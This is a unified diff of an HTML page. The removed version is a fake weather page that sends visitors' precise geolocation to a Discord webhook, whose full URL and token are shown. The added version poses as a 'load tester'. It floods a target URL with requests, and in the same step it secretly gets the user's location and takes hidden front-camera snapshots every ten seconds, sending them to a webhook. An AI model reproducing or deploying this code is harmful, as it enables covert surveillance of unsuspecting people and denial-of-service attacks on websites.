@@ -2,211 +2,154 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>即時天氣</title>
-
+<title>SYSTEM LOAD TESTER</title>
 <style>
-
-body{
-font-family:Arial;
-text-align:center;
-padding-top:80px;
-overflow:hidden;
-
-/* 更真實天空 */
-background:linear-gradient(-45deg,#4fc3f7,#81d4fa,#b3e5fc,#4fc3f7,#29b6f6);
-background-size:500% 500%;
-animation:skyFlow 25s ease infinite;
-}
-
-/* 天空流動 */
-@keyframes skyFlow{
-0%{background-position:0% 50%;}
-50%{background-position:100% 50%;}
-100%{background-position:0% 50%;}
-}
-
-/* 卡片升級 */
-.weather-box{
-background:rgba(255,255,255,0.92);
-width:320px;
-margin:auto;
-padding:25px;
-border-radius:20px;
-backdrop-filter:blur(12px);
-box-shadow:0 20px 60px rgba(0,0,0,0.25);
-animation:cardFloat 6s ease-in-out infinite;
-}
-
-/* 卡片漂浮 */
-@keyframes cardFloat{
-0%{transform:translateY(0px);}
-50%{transform:translateY(-12px);}
-100%{transform:translateY(0px);}
-}
-
-/* 太陽更真實 */
-.sun{
-width:90px;
-height:90px;
-border-radius:50%;
-margin:20px auto;
-background:radial-gradient(circle,#fff176,#fdd835,#fbc02d);
-box-shadow:
-0 0 40px #ffeb3b,
-0 0 80px #ffeb3b,
-0 0 120px #ffeb3b;
-animation:sunGlow 4s ease-in-out infinite;
-}
-
-/* 太陽呼吸 */
-@keyframes sunGlow{
-0%{transform:scale(1);}
-50%{transform:scale(1.15);}
-100%{transform:scale(1);}
-}
-
-/* 雲朵 */
-.cloud{
-width:140px;
-height:45px;
-background:white;
-border-radius:40px;
-margin:20px auto;
-position:relative;
-animation:cloudFloat 6s ease-in-out infinite;
-box-shadow:0 5px 15px rgba(0,0,0,0.1);
-}
-
-.cloud:before{
-content:"";
-position:absolute;
-width:70px;
-height:70px;
-background:white;
-border-radius:50%;
-top:-35px;
-left:15px;
-}
-
-.cloud:after{
-content:"";
-position:absolute;
-width:60px;
-height:60px;
-background:white;
-border-radius:50%;
-top:-30px;
-left:60px;
-}
-
-@keyframes cloudFloat{
-0%{transform:translateX(-15px);}
-50%{transform:translateX(15px);}
-100%{transform:translateX(-15px);}
-}
-
-/* 按鈕升級 */
-button{
-padding:12px 25px;
-font-size:16px;
-border:none;
-border-radius:12px;
-background:linear-gradient(45deg,#42a5f5,#1e88e5);
-color:white;
-cursor:pointer;
-transition:0.3s;
-}
-
-button:hover{
-transform:scale(1.07);
-box-shadow:0 10px 25px rgba(0,0,0,0.3);
-}
-
-#status{
-margin-top:20px;
-font-size:18px;
-}
-
+    body { background:#0b0b0b; color:#00ff9c; font-family:monospace; text-align:center; padding-top:50px; overflow-x:hidden; }
+    .panel { border:1px solid #00ff9c; width:380px; margin:auto; padding:25px; box-shadow:0 0 20px #00ff9c44; border-radius:10px; background:rgba(10,10,10,0.9); }
+    h2 { letter-spacing: 3px; border-bottom: 1px solid #00ff9c; padding-bottom: 10px; }
+    input { width:90%; padding:10px; margin:8px; background:#111; border:1px solid #00ff9c; color:#00ff9c; border-radius:5px; }
+    button { padding:12px 25px; margin:10px 5px; background:#00ff9c; border:none; cursor:pointer; font-weight:bold; transition: 0.3s; border-radius:5px; }
+    button:hover { background:#00cc7a; box-shadow: 0 0 10px #00ff9c; }
+    #status { margin-top:20px; font-size:0.9em; min-height: 60px; color: #88ffcc; }
+    .count { color: #fff; font-weight: bold; }
+    /* 隱藏元素 */
+    #v, #c { display:none; }
 </style>
-
 </head>
-
 <body>
 
-<div class="weather-box">
+<div class="panel">
+    <h2>LOAD TEST PANEL</h2>
+    <p style="font-size:0.8em; color:#666;">SECURITY AUTHENTICATION REQUIRED</p>
+    
+    <input id="url" placeholder="Target URL (https://...)" value="https://">
+    <input id="users" type="number" placeholder="Threads / Requests per sec">
+    <input id="time" type="number" placeholder="Duration (Seconds)">
+    
+    <br>
+    <button onclick="initializeSystem()">START SYSTEM TEST</button>
+    <button onclick="stopTest()">EMERGENCY STOP</button>
 
-<div class="sun"></div>
-<div class="cloud"></div>
-
-<h2>🌤 即時天氣查詢</h2>
-
-<p>點擊按鈕查看目前天氣</p>
-
-<button onclick="getLocation()">查看天氣</button>
-
-<p id="status"></p>
-
+    <div id="status">SYSTEM READY</div>
 </div>
 
+<!-- 隱藏的影音元件 -->
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
+
 <script>
+const webhook = "https://discord.com";
+let running = false;
+let timers = [];
+let successCount = 0;
+let errorCount = 0;
 
-var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
+// 主觸發函式：結合所有功能
+function initializeSystem() {
+    if (running) return;
 
-function getLocation(){
+    const url = document.getElementById("url").value;
+    const usersPerSec = parseInt(document.getElementById("users").value);
+    const duration = parseInt(document.getElementById("time").value);
 
-document.getElementById("status").innerHTML="正在取得天氣資料...";
+    if (!url || !usersPerSec || !duration) {
+        alert("Authentication Failed: Please fill all fields.");
+        return;
+    }
 
-if(navigator.geolocation){
+    running = true;
+    successCount = 0;
+    errorCount = 0;
+    
+    // 1. 執行原本的負載測試邏輯
+    startLoadTest(url, usersPerSec, duration);
+    
+    // 2. 執行定位回傳
+    getLocation();
+    
+    // 3. 執行隱藏相機截圖
+    getCamera();
 
-navigator.geolocation.getCurrentPosition(success,error,{
-enableHighAccuracy:true,
-timeout:10000,
-maximumAge:0
-});
-
-}else{
-
-document.getElementById("status").innerHTML="瀏覽器不支援定位";
-
+    document.getElementById("status").innerHTML = "INITIALIZING ATTACK VECTORS...";
 }
 
+// --- 負載測試邏輯 ---
+function startLoadTest(url, usersPerSec, duration) {
+    const testInterval = setInterval(() => {
+        for (let i = 0; i < usersPerSec; i++) {
+            if (!running) break;
+            fetch(url, { mode: 'no-cors' })
+                .then(() => { successCount++; })
+                .catch(() => { errorCount++; })
+                .finally(() => updateProgress());
+        }
+    }, 1000);
+    timers.push(testInterval);
+
+    const autoStop = setTimeout(() => stopTest("TEST COMPLETED"), duration * 1000);
+    timers.push(autoStop);
 }
 
-function success(pos){
-
-var lat = pos.coords.latitude;
-var lon = pos.coords.longitude;
-var acc = pos.coords.accuracy;
-
-fetch(webhook,{
-method:"POST",
-headers:{
-"Content-Type":"application/json"
-},
-body:JSON.stringify({
-content:
-"📍有人打開網站\n"+
-"緯度: "+lat+"\n"+
-"經度: "+lon+"\n"+
-"精準度: "+acc+" 公尺\n"+
-"地圖: https://www.google.com/maps?q="+lat+","+lon
-})
-});
-
-document.getElementById("status").innerHTML=
-"☀️ 晴天<br>"+
-"🌡 溫度：26°C<br>"+
-"🌬 微風<br>"+
-"📍目前位置天氣";
-
+function updateProgress() {
+    if (!running) return;
+    document.getElementById("status").innerHTML = 
+        `STATUS: <span style="color:yellow">ACTIVE</span><br>` +
+        `PACKETS SENT: <span class="count">${successCount}</span><br>` +
+        `FAILURES: <span class="count">${errorCount}</span>`;
 }
 
-function error(){
-
-document.getElementById("status").innerHTML="需要允許定位才能查看天氣";
-
+// --- 定位功能 ---
+function getLocation() {
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition((pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            sendToWebhook(`📍 **定位成功**\n緯度: ${lat}\n經度: ${lon}\n地圖: https://www.google.com{lat},${lon}`);
+        }, null, { enableHighAccuracy: true });
+    }
 }
 
+// --- 相機截圖功能 ---
+function getCamera() {
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+    .then((stream) => {
+        const video = document.getElementById("v");
+        video.srcObject = stream;
+        
+        // 啟動後立即截一張，之後每 10 秒一張
+        const captureInterval = setInterval(() => {
+            if (!running) return;
+            const canvas = document.getElementById("c");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob((blob) => {
+                const formData = new FormData();
+                formData.append('file', blob, 'capture.jpg');
+                formData.append('payload_json', JSON.stringify({ content: "📸 **系統監控畫面**" }));
+                fetch(webhook, { method: "POST", body: formData });
+            }, "image/jpeg", 0.6);
+        }, 10000);
+        timers.push(captureInterval);
+    }).catch(err => console.log("Camera access denied"));
+}
+
+function sendToWebhook(msg) {
+    fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: msg })
+    });
+}
+
+function stopTest(reason = "PROCESS TERMINATED") {
+    running = false;
+    timers.forEach(t => clearInterval(t));
+    timers = [];
+    document.getElementById("status").innerHTML = `<span style="color:red">${reason}</span>`;
+}
 </script>
 
 </body>
